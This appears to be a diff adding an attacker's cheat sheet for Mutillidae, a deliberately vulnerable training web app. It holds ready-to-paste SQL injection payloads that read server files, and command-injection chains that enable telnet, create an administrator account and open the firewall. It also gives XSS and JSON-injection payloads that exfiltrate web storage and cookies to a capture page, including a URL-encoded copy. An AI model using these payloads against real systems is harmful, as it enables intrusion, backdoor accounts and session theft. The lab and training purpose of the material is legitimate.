@@ -1,0 +1,177 @@
+
+------------------------------------------------------------------------------------------------------------
+Quick Demos
+------------------------------------------------------------------------------------------------------------
+
+	robots.txt 							(http://localhost/mutillidae/index.php?page=robots.txt)
+	lack of cache control 				(about:cache)
+	insecure direct object references 	(http://localhost/mutillidae/index.php?page=..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts)
+
+------------------------------------------------------------------------------------------------------------
+SQL Injection: General Progression
+------------------------------------------------------------------------------------------------------------
+
+	Recon: Returns a string that indicates the MySQL server version
+
+		Page: user-info.php
+		Field: Username
+		Value: 	' union select null,VERSION() AS username,null,null,null --  
+				' union select null,null,null,version(),null --
+
+
+	Recon: Extract table names from database
+
+		Page: user-info.php
+		Field: Username
+		Value:	' union select null,table_schema AS username,table_name AS password,null,null from INFORMATION_SCHEMA.TABLES-- 
+
+	Using advanced techniques: Open files on target operating system
+
+		Page: user-info.php
+		Field: username
+		Values:
+			' union select null, LOAD_FILE('../README') AS username, null, null ,null-- 
+			' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts') AS username, null, null ,null-- 
+			' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\inf\\cpu.inf') AS username, null, null ,null-- 
+			' union select null, LOAD_FILE('mysql_error.log'), null, null ,null-- 
+			' union select null, LOAD_FILE('..\\..\\..\\htdocs\\mutillidae\\index.php'), null, null ,null--  
+
+------------------------------------------------------------------------------------------------------------
+Command Injection: Enable Windows Telnet Service (Windows XP SP3) 
+------------------------------------------------------------------------------------------------------------
+
+Page: dns-lookup.php
+NOTE: Similar to Meterpreter run gettelnet <options>
+
+	List all services (sc query state= all)
+	
+		whatever && sc query state= all
+	
+	Check if service is running (sc query tlntsvr)
+	
+		whatever && sc query tlntsvr
+	
+	Configure telnet service to "demand" (sc config tlntsvr start= demand)
+	
+		whatever && sc config tlntsvr start= demand
+	
+	Start tlntsvr service (sc start tlntsvr)
+	
+		whatever && sc start tlntsvr
+	
+	Add user (net user <uname> <pw> /add)
+	
+		whatever && net user <uname> <pw> /add
+	
+	Add Telnet users group (net localgroup TelnetClients /add)
+	
+		whatever && net localgroup TelnetClients /add
+	
+	Add users to Administrators group (net localgroup Administrators <uname> /add)
+	
+		whatever && net localgroup Administrators <uname> /add
+	
+	Add Telnet user to group (net localgroup TelnetClients <uname> /add)
+	
+		whatever && net localgroup TelnetClients <uname> /add
+	
+	Allow firewall access (netsh firewall add portopening protocol=TCP port=23 name=telnet mode=enable scope=custom addresses=<your IP>)
+	
+		whatever && netsh firewall add portopening protocol=TCP port=23 name=telnet mode=enable scope=custom addresses=<your IP>
+
+	
+	One combined injection to enable telnet on Windows XP SP3 with Telnet disabled, firewall enabled, and no account in TelnetClients group
+	
+		whatever && sc config tlntsvr start= demand && sc start tlntsvr && net user root toor /add && net localgroup TelnetClients /add && net localgroup Administrators root /add && net localgroup TelnetClients root /add && netsh firewall add portopening protocol=TCP port=23 name=telnet mode=enable scope=custom addresses=192.168.56.101
+
+------------------------------------------------------------------------------------------------------------
+Remote Desktop Terminal Service
+------------------------------------------------------------------------------------------------------------
+
+	Check if service running (sc query termservice)
+	Configure service from "disabled" to "manual"(sc config termservice start= demand)
+	Start service (sc start termservice)
+	Enable Terminal Services (reg add "hklm\system\currentcontrolset\control\terminalserver" /v fdenytsconnections /t reg_dword /d 0)
+	Check if service listening (netstat -na | find "3389")
+	Add user (net user <uname> <pw> /add)
+	Add user to group (net localgroup "Remote Desktop Users" <uname> /add)
+	Configure firewall to allow RDP (netsh firewall set service type=remotedesktop mode=enable scope=custom addresses=<your IP>)
+
+------------------------------------------------------------------------------------------------------------
+HTML 5 Web Storage - Malicious user attacking site
+------------------------------------------------------------------------------------------------------------
+
+Page: http://localhost/mutillidae/index.php?page=html5-storage.php
+
+	DEMONSTRATION #1. Read DOM Storage values from our browser
+
+		Plan A (firebug):
+		
+		try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};console.log(m);}catch(e){alert(e.message);}
+
+		Plan B (DOM Injection):
+		
+		<span onmouseover='try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}'>DANGER: DONT MOUSEOVER</span>
+
+
+	DEMONSTRATION #2. Add new values to our DOM storage and read them back to show new values
+		
+		Plan A (Firebug):
+		
+		try{localStorage.setItem("AccountNumber","789456");sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");sessionStorage.setItem("CurrentlyLoggedInUser","1233456789");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};console.log(m);}catch(e){alert(e.message);}
+		
+		Plan B (DOM Injection):
+		
+		<span onmouseover='try{localStorage.setItem("AccountNumber","789456");sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");sessionStorage.setItem("CurrentlyLoggedInUser","1233456789");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}'>DANGER: DONT MOUSEOVER</span>
+		
+	DEMONSTRATION #3. Edit values currently in our DOM storage and read them back to show new values
+	
+		Plan A (Firebug):
+		
+		try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};console.log(m);}catch(e){alert(e.message);}try{localStorage.setItem("MessageOfTheDay","This was set by Firebug console!"); sessionStorage.setItem("CartSession","ABCDEFG");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};console.log(m);}catch(e){alert(e.message);}
+		
+		Plan B (DOM Injection):
+		
+		<span onmouseover='try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}try{localStorage.setItem("MessageOfTheDay","This was set by Firebug console!"); sessionStorage.setItem("CartSession","ABCDEFG");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}'>DANGER: DONT MOUSEOVER</span>
+		
+	DEMONSTRATION #4. Delete values currently in our DOM storage and read storage back
+
+		Plan A (Firebug): Using the removeItem() method
+		
+			try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.console.log(m);}catch(e){console.log(e.message);}try{localStorage.removeItem("MessageOfTheDay"); sessionStorage.removeItem("CartSession"); sessionStorage.removeItem("CurrentBrowser"); sessionStorage.removeItem("SessionStorageTarget"); localStorage.removeItem("LocalStorageTarget");}catch(e){console.log(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.console.log(m);}catch(e){console.log(e.message);}
+
+			Alternative: Use the clear method
+			try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.console.log(m);}catch(e){console.log(e.message);}try{localStorage.clear(); sessionStorage.clear();}catch(e){console.log(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.console.log(m);}catch(e){console.log(e.message);}
+
+		Plan B (DOM Injection):
+		
+			<span onmouseover='try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}try{localStorage.removeItem("MessageOfTheDay"); sessionStorage.removeItem("CartSession");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}'>DANGER: DONT MOUSEOVER</span>
+
+------------------------------------------------------------------------------------------------------------
+Cross site scripting / AJAX / Capture Data Combined Attacks
+------------------------------------------------------------------------------------------------------------
+
+Page: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
+
+	DEMONSTRATION #5. Sliently steal DOM Storage values from another users browser (advanced)
+
+		Peristent (Stored, Second Order) Cross Site Script
+		NOTE: This version "MySQL escapes" the "\n" new-line character by doubling up the "\" character because "\n" means new-line in MySQL and this is going to be inserted into the database.
+
+		<script>try{ var s = sessionStorage; var l = localStorage; var m = ""; var lXMLHTTP; for(i=0;i<s.length;i++){ m += "sessionStorage(" + s.key(i) + "):" + s.getItem(s.key(i)) + "; "; } for(i=0;i<l.length;i++){ m += "localStorage(" + l.key(i) + "):" + l.getItem(l.key(i)) + "; "; } var lAction = "http://localhost/mutillidae/capture-data.php?html5storage=" + m; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open("GET", lAction); lXMLHTTP.send(""); }catch(e){} </script>Pay no attention to the cross site script behind the curtain
+
+
+------------------------------------------------------------------------------------------------------------
+"Web 2.0" JSON Injection / AJAX / Capture Data Combined Attacks
+------------------------------------------------------------------------------------------------------------
+
+	DEMONSTRATION #10: Steal cookies with XHR injection, Page operates normally
+
+		Prefix: 16", "penTestTools": [{"tool_id":"16","tool_name":"Dig","phase_to_use":"Reconnaissance","tool_type":"DNS Server Query Tool","comment":"The Domain Information Groper is prefered on Linux over NSLookup and provides more information natively. NSLookup must be in debug mode to give similar output. DIG can perform zone transfers if the DNS server allows transfers."}]}} );
+		Payload: try{ var lAction = "http://localhost/mutillidae/capture-data.php?cookie=" + document.cookie; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open("GET", lAction); lXMLHTTP.send(""); }catch(e){};
+		Suffix: //
+		Complete Injection: 16", "penTestTools": [{"tool_id":"16","tool_name":"Dig","phase_to_use":"Reconnaissance","tool_type":"DNS Server Query Tool","comment":"The Domain Information Groper is prefered on Linux over NSLookup and provides more information natively. NSLookup must be in debug mode to give similar output. DIG can perform zone transfers if the DNS server allows transfers."}]}} ); try{ var lAction = "http://localhost/mutillidae/capture-data.php?cookie=" + document.cookie; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open("GET", lAction); lXMLHTTP.send(""); }catch(e){};//
+
+		Copy and Paste:
+	
+		%31%36%22%2c%20%22%70%65%6e%54%65%73%74%54%6f%6f%6c%73%22%3a%20%5b%7b%22%74%6f%6f%6c%5f%69%64%22%3a%22%31%36%22%2c%22%74%6f%6f%6c%5f%6e%61%6d%65%22%3a%22%44%69%67%22%2c%22%70%68%61%73%65%5f%74%6f%5f%75%73%65%22%3a%22%52%65%63%6f%6e%6e%61%69%73%73%61%6e%63%65%22%2c%22%74%6f%6f%6c%5f%74%79%70%65%22%3a%22%44%4e%53%20%53%65%72%76%65%72%20%51%75%65%72%79%20%54%6f%6f%6c%22%2c%22%63%6f%6d%6d%65%6e%74%22%3a%22%54%68%65%20%44%6f%6d%61%69%6e%20%49%6e%66%6f%72%6d%61%74%69%6f%6e%20%47%72%6f%70%65%72%20%69%73%20%70%72%65%66%65%72%65%64%20%6f%6e%20%4c%69%6e%75%78%20%6f%76%65%72%20%4e%53%4c%6f%6f%6b%75%70%20%61%6e%64%20%70%72%6f%76%69%64%65%73%20%6d%6f%72%65%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%20%6e%61%74%69%76%65%6c%79%2e%20%4e%53%4c%6f%6f%6b%75%70%20%6d%75%73%74%20%62%65%20%69%6e%20%64%65%62%75%67%20%6d%6f%64%65%20%74%6f%20%67%69%76%65%20%73%69%6d%69%6c%61%72%20%6f%75%74%70%75%74%2e%20%44%49%47%20%63%61%6e%20%70%65%72%66%6f%72%6d%20%7a%6f%6e%65%20%74%72%61%6e%73%66%65%72%73%20%69%66%20%74%68%65%20%44%4e%53%20%73%65%72%76%65%72%20%61%6c%6c%6f%77%73%20%74%72%61%6e%73%66%65%72%73%2e%22%7d%5d%7d%7d%20%29%3b%20%74%72%79%7b%20%76%61%72%20%6c%41%63%74%69%6f%6e%20%3d%20%22%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%2f%6d%75%74%69%6c%6c%69%64%61%65%2f%63%61%70%74%75%72%65%2d%64%61%74%61%2e%70%68%70%3f%63%6f%6f%6b%69%65%3d%22%20%2b%20%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%20%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%20%6c%58%4d%4c%48%54%54%50%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%7b%7d%3b%20%6c%58%4d%4c%48%54%54%50%2e%6f%70%65%6e%28%22%47%45%54%22%2c%20%6c%41%63%74%69%6f%6e%29%3b%20%6c%58%4d%4c%48%54%54%50%2e%73%65%6e%64%28%22%22%29%3b%20%7d%63%61%74%63%68%28%65%29%7b%7d%3b%2f%2f
